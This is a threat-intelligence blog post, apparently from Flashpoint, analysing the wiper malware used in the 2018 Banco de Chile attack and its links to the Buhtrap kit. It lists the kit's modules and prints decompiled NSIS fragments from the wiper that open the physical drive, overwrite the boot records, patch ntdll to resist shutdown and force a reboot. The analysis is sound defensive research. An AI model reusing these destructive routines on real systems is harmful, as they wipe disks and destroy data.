{
    "title": "flashpoint - banco de chile ‘mbr killer_u2019 reveals hidden nexus to buhtrap malware kit used to target financial institutions_ payment networks",
    "text": "Banco de Chile ‘MBR Killer’ Reveals Hidden\nNexus to Buhtrap Malware Kit Used to Target\nFinancial Institutions, Payment Networks\n JUNE 12, 2018 BLOG\nWiper malware that may have destroyed as many as 9,000 workstations and 500 servers  inside the Banco de\nChile in a late-May attack has similarities to the Buhtrap malware component known as MBR Killer, leaked to\nthe underground in February 2016.\nAnalysts at Flashpoint reverse-engineered the identified malware linked to the May 24 attack against the\ncountry’s largest financial institution, and said the malware is a modified version of a MBR Killer module known\nas kill_os. MBR Killer infections render the local operating system and the Master Boot Record unreadable.\nAccording to bank officials, however, the wiper malware was just cover for a deeper attack against endpoints\nhandling sensitive transactions and messaging over the SWIFT network. The SWIFT banking network, or the\nSociety for Worldwide Interbank Financial Telecommunication, is the primary means of secure, reliable\ncommunications and money transfers between financial institutions.\nOn Sunday, Banco de Chile general manager Eduardo Ebensperger said in a statement  that customer\naccounts were not affected, but critical processes such as branch services and telephone banking were\nimpacted, as were executive offices and cashier personnel. Ebensperger told Chilean media outlet Pulso  that\n$10 million was stolen and the stolen funds were filtered to entities in Hong Kong. He added that a forensic\nanalysis conducted by Microsoft concluded this was an “international attack” and attributed it to either Eastern\nEuropean or Asian groups.\nBuhtrap malware and its components, including MBR Killer, were previously used in attacks against multiple\nRussian financial institutions, resulting in losses of 97 million rubles, or $1.23 million USD. The attacks in Russia\nforced one bank to disconnect from the Russian electronic payment system.\nThe attack in Chile comes on the heels of incidents affecting several banks in Mexico that use its Sistema de\nPagos Electrónicos Interbancarios (SPEI) interbank transfer system, resulting in approximately $15.4 million\nUSD in losses. In January, Flashpoint was aware of a separate malware attack targeting Mexican financial\ninstitutions that followed a pattern similar to previous attacks, with possible attribution to North Korean\nmalware. Flashpoint was not able to analyze the malware targeting Mexican financial institutions, though the\nFBI associated the attack with North Korean malware. A report from El Financiero , a Mexican financial\npublication, following the January incident identified the attack as “FALLCHILL,” a North Korean remote\nadministration tool (RAT) targeting aerospace, telecommunications, and financial organizations.\nAt this time, there does not appear to be a connection between attacks against Mexico’s banking institutions\nand the purported attack on Banco de Chile because the tactics, techniques, and procedures (TTP) used by\nthe threat actors differ.\nThe similarities between the malicious code used in Chile and the leaked code from 2016 are in the use of the\nsame NSIS script, below, in both instances. NSIS, or Nullsoft Scriptable Install System, is an open source\nsystem used to build Windows installers.\nThe leaked Buhtrap code contains almost identical Nullsoft Scriptable Install System (NSIS) script as the\nunpacked Banco de Chile malware.\nBy and large, the Buhtrap malware is complex and includes more than a dozen modules that give attackers\nthe capability to install more malicious code, retain remote control over a compromised machine, and steal\ncredentials among others. A list of available modules follows:\n• “BHO”: a module designed to intercept and replace pages in the Internet Explorer browser.\n• “kill_os”: a module designed to erase the MBR.\n• “Loaders”: builders of NSIS scripts designed to install malware.\n• “Mimimod”: a modified version of the “Mimikatz” program, used to obtain user credentials in the system.\n• “ID”: an algorithm for obtaining the unique number of the infected machine.\n• “BSShide”: a module designed to hide payment orders in the Business Support Systems (BSS). It modifies the\npage displayed to the user. SWIFT is part of the BSS.\n• “Antidetekt”: a module designed to detect virtual environments and “sandboxes.”\n• “UAC”: a module to bypass the User Account Control (UAC) protection.\n• “RDP”: modifies the OS for the potential simultaneous operation of several users in the system.\n• “VNC”: remote PC control with backconnect.\n• “DLL Side-Loading”: used to install a keylogger and to provide communication with the control panel.\nEnables installation and operation of other modules in the system.\n• “Control panel”: used to maintain visibility into infections and install additional modules to the infected host.\n• “Builder”: a program designed to collect Trojan modules in one executable file.\n• “MWI”: a collection of exploits, part of the “Microsoft Word Intruder” tool that was available on underground.\nThe Banco de Chile MBR Killer was also packed with VMProtect, meant to protect against forensic analysis\nand reverse engineering. Notably, the malware does not target victims based on locale or language; however, a\nSpanish language and locale check is present in the malware. The attribution behind the Banco de Chile\nattack remains uncertain; it is unclear if this code was simply reused by a copycat group or linked to the\noriginal group behind the Buhtrap malware. Originally, the kill_os module was leveraged to hide the evidence\nof successful bank network penetrations.\nBanco De Chile: Malware Technical Analysis\nThe malware is packed with VMProtect/NSIS, and is executed via the System.dll in %TEMP%.\nI. Main loop CreateFile API accessing \\\\\\.\\PHYSICALDRIVE0:\nFunction main_loop_CreateFile\n    IntFmt $1 “\\\\.\\PHYSICALDRIVE%D” $0\n    Push $0\n    StrCpy $0 $1\n    System::Call “KERNEL32::CREATEFILE(t, i, i, i, i, i, i) i (‘$0’, ${GENERIC_READ}|${GENERIC_WRITE},\n${FILE_SHARE_READ}|${FILE_SHARE_WRITE}, ${NULL}, ${OPEN_EXISTING},\n${FILE_ATTRIBUTE_NORMAL}, ${NULL}) .r2”\n    Pop $0\nFunctionEnd\nII. Master boot record setup:\n!define\nSTMBR\n‘(&i446, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1,\n&i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1,\n&i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i2) i’\nIII.MBR logical block addressing:\n!define\nSTMBRLBA\n‘(&i446, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1,\n&i1, &i1, &i1, &i4, &i4, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i1, &i4, &i4, &i2) i’\nIV. Volume boot record NTFS:\n!define\nSTVBR_NTFS\n‘(&i3, &i8, &i2, &i1, &i2, &i24, &i8, &i8, &i8, &i4) i’\nV. Process NTFS boot:\nOverwrite MBR\nOverwrite Master File Table (MFT) mirror\nOverwrite Volume Boot Record (VBR) mirror\nOverwrite Extended Boot Record (EBR)\nThe following system API calls are used to overwrite the system:\n${ForEach} $7 1 ${OVERWRITE_COUNT} + 1\n    System::Call “kernel32::SETFILEPOINTER(i, i, *p ,i) i (r2, r4, r3, ${FILE_BEGIN}) .r8”\n    ${If} $8 <> -1\nSystem::Call “kernel32::WRITEFILE(i, i, i, p, i) i (r2, r5, r9, r6, ${NULL})”\nSystem::Call “kernel32::FlushFileBuffers(i) i (r2)”\n    ${EndIf}\nVI. Process protection malware from shutdown:\nSystem::Call “KERNEL32::GETMODULEHANDLE(t) p (‘ntdll.dll’) .r0”\n${If} $0 <> ${NULL}\n    System::Call “KERNEL32::GETPROCADDRESS(p, t) p (r0, ‘ZwClose’) .r1”\n    ${If} $1 <> ${NULL}\nSystem::Call “KERNEL32::VIRTUALPROTECT(p, i, i, *i) i (r1, 6, ${PAGE_EXECUTE_READWRITE}, .r2) .r0”\n${If} $0 <> 0\n    System::Alloc 6\n    pop $3\n    System::Call “NTDLL::MEMCPY(p, p ,i) i (r3, r1, 6)”\n    System::Call “NTDLL::MEMCPY(p, t, i) i (r1, t ‘1′, 6)”\n    System::Call “KERNEL32::CLOSEHANDLE(i) i (0x12345678) .r4”\n    System::Call “NTDLL::MEMCPY(p, p, i) i (r1, r3, 6)”\n    System::Free $3\nVII. System shutdown instruction:\nExitWindowsEx_EWX_REBOOT_\n    Push $1\n    StrCpy $1 ${EWX_REBOOT}|${EWX_FORCE}\n    System::Call “USER32::EXITWINDOWSEX(i, i) i ($1,\n${SHTDN_REASON_MAJOR_SOFTWARE}|${SHTDN_REASON_MINOR_UPGRADE}) i .r0”\n    Pop $1\nFunctionEnd\nPossible action :\nAs the MBR Killer codebase was identical with minor modification to the Buhtrap simple MBR Killer, reviewing\nany mitigation against the Buhtrap malware might assist with mitigation exposure to this threat.\nReview and mitigate for any malware execution from %TEMP% directory specifically if it calls “System.dll.”\nTo download the MBR Killer indicators of compromise (IOCs), click here .\nIan W. Gray\nIan W. Gray is the director of intelligence for the Americas unit of Flashpoint’s Global Intelligence Team. Ian\nactively researches and analyzes cybercriminal use of new and emerging technologies for malicious purposes\nin English and Portuguese-language communities. Additionally, he has been researching policy gaps that\ncontribute to various forms of fraud, as well as the economic factors contributing to cybercrime. Ian is also an\nadjunct Professor at Fordham University’s Master of Cybersecurity Program.\nVitali Kremez\nVitali Kremez is a Director of Research at Flashpoint. He oversees analyst collection efforts and leads a\ntechnical team that specializes in researching and investigating complex cyber attacks, network intrusions, data\nbreaches, and hacking incidents. Vitali is a strong believer in responsible disclosure and has helped enterprises\nand government agencies deliver indictments of many high-profile investigations involving data breaches,\nnetwork intrusions, ransomware, computer hacking, intellectual property theft, credit card fraud, money\nlaundering, and identity theft. Previously, Vitali enjoyed a rewarding career as a Cybercrime Investigative\nAnalyst for the New York County District Attorney’s Office.\nHe has earned the majority of certifications available in the information technology, information security, digital\nforensics, and fraud intelligence fields. A renowned expert, speaker, blogger, and columnist, Vitali has\ncontributed articles to Dark Reading, BusinessReview, and Infosecurity Magazine and is a frequent\ncommentator on cybercrime, hacking incidents, policy, and security.\nFlashpoint Intelligence Brief\nYour email address…\nSubscribeBlog\n MARCH 17, 2020\nFlashpoint Analyst\nKnowledge Pages\nBy Chris Camacho & Steph Shample As\nformer users of the Flashpoint platform,\ntyping in keywords of interest to our\nbusiness such as malware, ransomware,\nbitcoin, or Iran for example, would yield\nmany pieces of content. Though\ncomprehensive in terms of volume of\ninformation, it still required pulling\ntogether something more concise that\ncould be […]\nBLOG\n  MARCH 16, 2020\nCOVID-19 Key Developments:\nMarch 6-12\nThe spread of coronavirus continues to\nhave a significant impact across the world.\nAs a result, Flashpoint has developed an\nAnalyst Knowledge Page around COVID-\n19 for our clients as a way to provide an\noverview of findings with the opportunity to\ndive deeper into the data. This blog\naddresses key findings from Flashpoint\nanalyst observations […]\nBLOG\n MARCH 12, 2020\n4 Steps Toward Evolving\nYour Risk Intelligence\nProgram\nBy Mike Smola Most professionals know\nthat they need an intelligence program,\nbut do not know where to start. My aim is\nto help make this process easier, as I\nhelped stand up and evolve a risk\nintelligence program at one of the largest\nretailers in the world. Based on this\nexperience, I have four […]\nBLOG\nIntelligence Platform\nCredentials Monitoring\nFlashpoint API\nProfessional Services\nThreat Response\nAlertingAbout\nPartners\nMedia\nEvents\nCareers\nContact UsFlash Talks\nPodcasts\nBlog\nCase StudiesLinkedIn\nTwitter\nFacebook\n© 2020 Flashpoint. All rights reservedTerms of Service  Privacy Policy  Cookie Policy  CCPAProducts & Services\n Company\n Resources\n Social\nAbout  Products  Services  Integrations  Partners  Blog Resources  Careers\n   EN\nExplore Educate Engage  Request a Demo\n "
}